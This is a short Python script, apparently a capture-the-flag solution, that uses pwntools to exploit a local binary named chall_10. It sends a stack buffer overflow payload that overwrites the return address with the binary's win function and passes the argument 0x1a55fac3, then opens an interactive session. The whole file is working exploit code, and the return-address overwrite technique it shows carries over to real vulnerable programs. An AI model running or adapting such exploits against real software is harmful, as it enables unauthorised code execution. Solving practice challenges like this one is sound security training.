# coding: utf-8
from pwn import *
def chall10():
    p=process("./chall_10")
    elf=ELF("./chall_10")
    payload= b'a'*0x308+b'a'*4+p32(elf.sym.win)+b'c'*4+p32(0x1a55fac3)
    p.sendline(payload)
    p.interactive()
   
chall10()
